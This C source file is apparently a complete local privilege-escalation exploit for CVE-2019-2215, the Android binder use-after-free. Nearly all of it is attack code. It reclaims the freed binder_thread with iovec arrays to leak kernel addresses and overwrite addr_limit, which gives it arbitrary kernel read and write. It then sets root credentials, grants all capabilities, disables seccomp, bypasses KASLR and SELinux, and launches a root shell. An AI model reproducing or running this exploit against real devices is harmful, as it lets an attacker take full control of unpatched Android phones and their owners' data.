#include "include/cve_2019_2215.h"

void *dummy_page_4g_aligned;
void *task_struct;

int open_dev(char *filename) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        printf("[-] Cannot open '%s'\n", filename);
        exit(1);
    }
    return fd;
}

void bind_to_core() {
    int ret;
    cpu_set_t cpuSet;
    CPU_ZERO(&cpuSet);
    CPU_SET(0, &cpuSet);
    ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpuSet);
    if (ret < 0) {
        printf("[-] Binding failed\n");
        exit(EXIT_FAILURE);
    }
}

void *leak_task_struct() {
    int fd = open_dev("/dev/binder");

    // create epoll list
    struct epoll_event event = {.events = EPOLLIN};
    int epfd = epoll_create(1000);
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event); // add file descriptor to epoll list

    // create pipe, blocking by default
    int iov_pipe[2];
    int retPipe = pipe(iov_pipe);
    if (retPipe == -1) {
        printf("\t[-] Pipe creation failed\n");
        exit(EXIT_FAILURE);
    }

    // set its buffer size to 0x1000 (by default 65536 = 16 * 0x1000)
    int retFnctl = fcntl(iov_pipe[0], F_SETPIPE_SZ, PAGE_SIZE);
    if (retFnctl == -1) {
        printf("\t[-] Resize pipe failed\n");
        exit(EXIT_FAILURE);
    }

    // allocate a buffer for iovec and for reading from pipe
    void *dummy_page = malloc(SPINLOCK);  // 0x10001 is spinlock value after unlinking !

    void *leak_buffer[PAGE_SIZE / 8] = {0};

    // create iovec array of size 400, it will be copied in place of binder_thread
    // in kernel memory
    struct iovec iovec_array[IOV_CNT];
    memset(iovec_array, 0, sizeof(iovec_array));

    iovec_array[TASK_LIST_OFFSET - 2].iov_base = dummy_page; // iovec[9].iov_base
    iovec_array[TASK_LIST_OFFSET - 2].iov_len = PAGE_SIZE;      // iovec[9].iov_len, blocking

    iovec_array[TASK_LIST_OFFSET - 1].iov_base = dummy_page;
    iovec_array[TASK_LIST_OFFSET - 1].iov_len = 0x0; // spinlock = 0x0

    iovec_array[TASK_LIST_OFFSET].iov_base = (void *) dummy_page; // iovec[11].iov_base => &wait
    // 11 -> iovec[11].iov_len => wait, with 0x10001 it does hang
    iovec_array[TASK_LIST_OFFSET].iov_len = (SPINLOCK - 1) + PAGE_SIZE;

    //  create a process, it performs unlinking
    //  then resume writev execution by reading data from the pipe
    pid_t pid = fork();

    if (pid == -1) {
        printf("\t[-] Could not fork\n");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY); // wait for the parent to start writing to iov_pipe and block before 11th iovec

        // trigger unlink in an other process
        // iovec[11].iov_base is overwritten by thread + 0xA0
        printf("\t[+] Process is triggering unlink\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);

        // resume parent execution by reading from fd, we don't actually care about those data
        ssize_t readRet = read(iov_pipe[0], dummy_page, PAGE_SIZE);
        if (readRet == -1) {
            printf("\t[-] 1. Process cannot read iov_pipe\n");
            exit(EXIT_FAILURE);
        }

        readRet = read(iov_pipe[0], dummy_page, SPINLOCK);
        if (readRet == -1) {
            printf("\t[-] 2. Process cannot read iov_pipe\n");
            exit(EXIT_FAILURE);
        }

        printf("\t[+] Process read %zd bytes from iov_pipe\n", readRet);
        printf("\t[+] Child process exiting\n");
        exit(EXIT_SUCCESS);
    }

    // free struct binder_thread
    ioctl(fd, BINDER_THREAD_EXIT, NULL);

    // start to write in pipe
    printf("[+] Starting to write 0x1000 bytes in iov_pipe\n");
    ssize_t retWritev = writev(iov_pipe[1], iovec_array, IOV_CNT);
    if (retWritev == -1) {
        printf("[-] Failed to create iovec array with 'writev'\n");
        exit(EXIT_FAILURE);
    }
    fflush(stdout);

    printf("[+] Wrote %zd bytes with writev in pipe\n", retWritev);

    fflush(stdout);

    // wait for children to exit
    int status;
    wait(&status);

    if (status == EXIT_FAILURE) {
        return 0;
    }

    fflush(stdout);

    ssize_t readRet = read(iov_pipe[0], leak_buffer, PAGE_SIZE);
    if (readRet == -1) {
        printf("[-] Cannot read iov_pipe\n");
        return 0;
    }
    printf("[+] Read %zd bytes from iov_pipe\n", readRet);
    free(dummy_page);

    // 0xb0 is offset of wait.task_struct.next, first leaked data
    printf("[+] thread is at: %p\n", leak_buffer[0] - 0xb0);
    close(fd);
    printf("[+] @waitqueue: %p\n", (void *) leak_buffer[0] - 0x8);
    return leak_buffer[0x1d];
}

bool overwrite_addr(void *addr, unsigned long *overwrite_array, unsigned int overwrite_size) {
    int fd = open_dev("/dev/binder");

    struct epoll_event event = {.events = EPOLLIN};
    int epfd = epoll_create(1000);
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);

    // create unix socket, its works with readv too
    int socks[2];
    int retSocketPair = socketpair(AF_UNIX, SOCK_STREAM, 0, socks);
    if (retSocketPair == -1) {
        printf("[-] Socket creation failed\n");
        return false;
    }

    void *dummy_page = malloc(SPINLOCK);
    memset(dummy_page, 0, SPINLOCK);

    unsigned long overflow_array[] = {
            (unsigned long) dummy_page, // iovec[11].iov_base
            0x20,                      // iovec[11].iov_len = second chunk size (sizeof overflow array but without 0xff...fe value which will be processed in 12th iovec array)
            (unsigned long) addr,       // iovec[12].iov_base
            overwrite_size,            // iovec[12].iov_len
    };                             // new addr_limit's value, written in a second time

    // create iovec array of size 400, it will be copied in place of binder_thread
    // in kernel memory
    struct iovec iovec_array[IOV_CNT];
    memset(iovec_array, 0, sizeof(iovec_array));

    iovec_array[TASK_LIST_OFFSET - 2].iov_base = dummy_page;
    // write 1 byte to fd, it will block as long as we don't write on socks !
    iovec_array[TASK_LIST_OFFSET - 2].iov_len = 0x1;

    iovec_array[TASK_LIST_OFFSET - 1].iov_base = dummy_page;
    iovec_array[TASK_LIST_OFFSET - 1].iov_len = 0x0; // spinlock -> become 0x10001

    iovec_array[TASK_LIST_OFFSET].iov_base = (void *) dummy_page; // invalid but overwritten with &wait
    // => start writing to dummy page and block before the end ! Address is then overwritten with wait.task_list.next (unlink) then resume and write overflow_array
    iovec_array[TASK_LIST_OFFSET].iov_len = SPINLOCK + 0x20;

    iovec_array[TASK_LIST_OFFSET + 1].iov_base = (void *) dummy_page; // overwritten with addr
    iovec_array[TASK_LIST_OFFSET + 1].iov_len = overwrite_size;// overwritten with overwrite_size

    // recvmsg vars
    struct msghdr msg = {
            .msg_iov = iovec_array,
            .msg_iovlen = IOV_CNT};

    fflush(stdout);

    // process will perform unlinking (overwrite iovec[11].iov_base with thread + 0xa0) then resume
    // recvmsg by writting data in socket those data will be written at thread + 0xa0
    pid_t pid = fork();
    if (pid == -1) {
        printf("[-] Could not fork\n");
        return false;
    }

    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY);

        // trigger unlinking after recvmsg has block
        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);

        // resume
        int retWrite = write(socks[1], dummy_page, 0x1);
        if (retWrite != 0x1) {
            printf("\t[-] 1. Write on pipe failed (%d)\n", retWrite);
            exit(EXIT_FAILURE);
        }

        // wait.lock becomes 0x10001 so write 0x10001 bytes
        retWrite = write(socks[1], dummy_page, SPINLOCK);
        if (retWrite != SPINLOCK) {
            printf("\t[-] 2. Write on pipe failed (%d)\n", retWrite);
            exit(EXIT_FAILURE);
        }

        // resume recvmsg and overwrite some iovec arrays
        retWrite = write(socks[1], overflow_array, sizeof(overflow_array));
        if (retWrite != sizeof(overflow_array)) {
            printf("\t[-] 3. Write on pipe failed\n");
            exit(EXIT_FAILURE);
        }

        // overwrite addr
        retWrite = write(socks[1], overwrite_array, overwrite_size);
        if (retWrite != overwrite_size) {
            printf("\t[-] 4. Write on pipe failed\n");
            exit(EXIT_FAILURE);
        }

        exit(EXIT_SUCCESS);
    }

    // free struct binder_thread
    ioctl(fd, BINDER_THREAD_EXIT, NULL);

    int retRecvmsg = recvmsg(socks[0], &msg, MSG_WAITALL);
    if (retRecvmsg == -1) {
        printf("[-] recvmsg has failed\n");
        exit(EXIT_FAILURE);
    }

    int status;
    wait(&status);

    if (status == EXIT_FAILURE) {
        return false;
    }

    close(fd);
    return true;
}

bool leak_addr(void *addr, unsigned long *leak_array) {
    int fd = open_dev("/dev/binder");
    int epfd;

    struct epoll_event event = {.events = EPOLLIN};
    epfd = epoll_create(1000);
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);

    int iov_pipe[2];
    int retPipe = pipe(iov_pipe);
    if (retPipe == -1) {
        printf("[-] Pipe creation failed\n");
        return false;
    }

    // set its buffer size to 0x1000 (by default 65536 = 16 * 0x1000)
    int retFnctl = fcntl(iov_pipe[0], F_SETPIPE_SZ, PAGE_SIZE);
    if (retFnctl == -1) {
        printf("[-] Resize pipe failed\n");
        return false;
    }

    // allocate a buffer for iovec and for reading from pipe
    void *dummy_page = malloc(SPINLOCK);  // 0x10001 is spinlock value after unlinking !
    void *dummy_page2 = malloc(SPINLOCK); // 0x10001 is spinlock value after unlinking !
    unsigned long thread_leak[PAGE_SIZE / 8] = {0};


    // create iovec array of size 400, it will be copied in place of binder_thread
    // in kernel memory
    struct iovec iovec_array[IOV_CNT];
    memset(iovec_array, 0, sizeof(iovec_array));

    // get the mutliple of 4096=0x1000 directly over leak_size
    // build to block
    iovec_array[TASK_LIST_OFFSET - 2].iov_base = dummy_page; // iovec[9].iov_base
    iovec_array[TASK_LIST_OFFSET - 2].iov_len = PAGE_SIZE;      // iovec[9].iov_len, blocking

    iovec_array[TASK_LIST_OFFSET - 1].iov_base = dummy_page;
    iovec_array[TASK_LIST_OFFSET - 1].iov_len = 0x0; // spinlock = 0x0

    iovec_array[TASK_LIST_OFFSET].iov_base = (void *) dummy_page; // 11 -> iovec[11].iov_base => wait
    iovec_array[TASK_LIST_OFFSET].iov_len = 0x2000;              // 11 -> iovec[11].iov_len => wait

    iovec_array[TASK_LIST_OFFSET + 1].iov_base = dummy_page;
    iovec_array[TASK_LIST_OFFSET + 1].iov_len = (SPINLOCK - 1) + PAGE_SIZE; // spinlock = 0x0

    // process vars
    pid_t pid;

    pid = fork();

    if (pid == -1) {
        printf("[-] Could not fork\n");
        return false;
    }

    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY); // wait for the parent to start writing to iov_pipe and block before 11th iovec

        // trigger unlink in an other process
        // iovec[11].iov_base is overwritten by thread + 0xA0
        printf("\t[+] Process is triggering unlink\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);

        // resume parent execution by reading from fd, we don't actually care about those data
        ssize_t readRet = read(iov_pipe[0], dummy_page, PAGE_SIZE);
        if (readRet == -1) {
            printf("\t[-] 1. Process cannot read iov_pipe\n");
            exit(EXIT_FAILURE);
        }

        readRet = read(iov_pipe[0], dummy_page, SPINLOCK);
        if (readRet == -1) {
            printf("\t[-] 2. Process cannot read iov_pipe\n");
            exit(EXIT_FAILURE);
        }

        // grab leak, extract thread+0xb0 (iovec[11].iov_base)
        readRet = read(iov_pipe[0], thread_leak, PAGE_SIZE);
        if (readRet == -1) {
            printf("\t[-] 3. Process cannot read iov_pipe (leak)\n");
            exit(EXIT_FAILURE);
        }

        unsigned long thread_addr = thread_leak[0] - 0xb0; // wait.task_list.next
        if ((thread_addr & 0xff) != 0x00) {
            printf("\t[-] Leak of wait.task_list.next failed\n");
            exit(EXIT_FAILURE);
        }
        printf("\t[+] @thread_addr=%lx\n", thread_addr);

        // perform overwrite : then overwrite iovec[11].len => 0x1000 and iovec[11].iov_base => address of leak
        fflush(stdout);

        unsigned long buffer[] = {0x2000, (unsigned long) addr, PAGE_SIZE};
        if (!overwrite_addr((void *) (thread_addr + 0xb0 + 0x8), buffer, sizeof(buffer))) {
            printf("\n[-] Overwrite addr failed\n");
        }

        printf("\t[+] Process read %zd bytes from iov_pipe\n", readRet);
        printf("\t[+] Child process exiting\n");

        // grab leak, extract thread+0xb0 (iovec[11].iov_base)
        readRet = read(iov_pipe[0], thread_leak, PAGE_SIZE);
        if (readRet == -1) {
            printf("[-] 4. Cannot read useless data\n");
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }

    // free struct binder_thread
    ioctl(fd, BINDER_THREAD_EXIT, NULL);

    // start to write in pipe
    ssize_t retWritev = writev(iov_pipe[1], iovec_array, IOV_CNT);
    if (retWritev == -1) {
        printf("\t[-] Failed to create iovec array with 'writev'\n");
        exit(EXIT_FAILURE);
    }
    fflush(stdout);

    // wait for children to exit
    int status;
    wait(&status);

    if (status == EXIT_FAILURE) {
        return false;
    }

    fflush(stdout);
    // read the leak from thread + 0xa0. Our leak is at offset 400 (0x190)
    ssize_t readRet = read(iov_pipe[0], leak_array, PAGE_SIZE);
    if (readRet == -1) {
        printf("\t[-] Cannot read iov_pipe\n");
        return false;
    }
    free(dummy_page);

    close(fd);
    return true;
}

bool is_valid_kaddr(unsigned long kaddr) {
    return kaddr >= KERNEL_BASE && ((0xffffff ^ (kaddr >> 40)) == 0);
}

unsigned long get_current_thread_info(unsigned long stack) {
    return stack & ~(THREAD_SIZE - 1);
}

bool check_addr_limit(unsigned long addr_limit_addr) {
    unsigned long addr_limit_value = kernel_read_ulong((unsigned long) addr_limit_addr);
    if (addr_limit_value == 0xfffffffffffffffe) {
        return true;
    }
    printf("[-] check addr_limit=0x%lx\n", addr_limit_value);
    return false;
}

unsigned long get_kaslr_offset(unsigned long task_struct_addr) {
    unsigned long fair_sched_class = kernel_read_ulong(task_struct_addr + SCHED_CLASS_OFFSET);
    return fair_sched_class - FAIR_SCHED_CLASS;
}

void execute_sh() {
    setenv("PS1", "CVE-2019-2215:/ # ", 1);
    system("/system/bin/sh -p");
}

int main() {
    bind_to_core();
    printf("[>] Leak task_struct\n");
    task_struct = leak_task_struct();
    if (task_struct == 0) {
        printf("[-] Failed to leak task_struct address\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] @task_struct=%p\n", task_struct);

    // leak stack address
    unsigned long ts_buffer[PAGE_SIZE / 8] = {0};

    printf("[>] Read stack address\n");
    if (!leak_addr(task_struct, ts_buffer)) {
        printf("[-] leak failed\n");
        exit(EXIT_FAILURE);
    }
    unsigned long stack = ts_buffer[1];
    printf("[+] @stack=%lx\n", stack);

    // leak thread info address from stack
    printf("[>] Read thread_info address\n");
    unsigned long thread_info = get_current_thread_info(stack);
    printf("[+] @thread_info=%lx\n", thread_info);

    // leak value of addr_limit
    printf("[>] Read addr_limit address\n");
    unsigned long ti_buffer[PAGE_SIZE / 8] = {0};
    void *addr_limit_addr = (void *) thread_info + 0x8;
    if (!leak_addr(addr_limit_addr, ti_buffer)) {
        printf("[-] leak failed\n");
        exit(EXIT_FAILURE);
    }
    unsigned long addr_limit = ti_buffer[0];
    printf("[+] @addr_limit=%p, addr_limit=%lx\n", addr_limit_addr, addr_limit);

    // overwrite value of addr_limit
    printf("[>] Overwrite addr_limit with 0xfffffffffffffffe\n");
    unsigned long addr_limit_array[] = {0xfffffffffffffffe};
    if (!overwrite_addr(addr_limit_addr, addr_limit_array, sizeof(addr_limit_array))) {
        printf("[-] Overwrite addr failed\n");
        exit(-1);
    }

    if (!check_addr_limit((unsigned long) addr_limit_addr)) {
        exit(-1);
    }

    // now let's become r00t !
    unsigned long cred_addr = kernel_read_ulong((unsigned long) task_struct + STRUCT_CRED_OFFSET);
    printf("[+] struct_cred is at: 0x%lx\n", cred_addr);

    // 1 - Bypass DAC, becoming root user
    if (!become_root(cred_addr)) {
        exit(-1);
    }

    // 2 - Getting all CAP
    get_all_caps(cred_addr);

    // 3 - Disable seccomp
    if (!disable_seccomp((unsigned long) task_struct, thread_info)) {
        exit(-1);
    }

    // 4 - get avc_cache address (bypass kaslr)
    unsigned long kaslr_offset = get_kaslr_offset((unsigned long) task_struct);
    printf("[+] Kaslr offset is: %lx\n", kaslr_offset);

    unsigned long avc_cache_addr = kaslr_offset + AVC_CACHE;
    printf("[+] @avc_cache=%lx\n", avc_cache_addr);

    // 5 - Bypass SELinux
    unsigned int sid = get_sid(cred_addr);
    printf("[+] SID=%u\n", sid);

    live_with_selinux(); // must fail to generate avc_nodes
    overwrite_avc_cache(avc_cache_addr, sid);
    live_with_selinux(); // must succeed

    fflush(stdout);

    execute_sh();

    return 0;
}
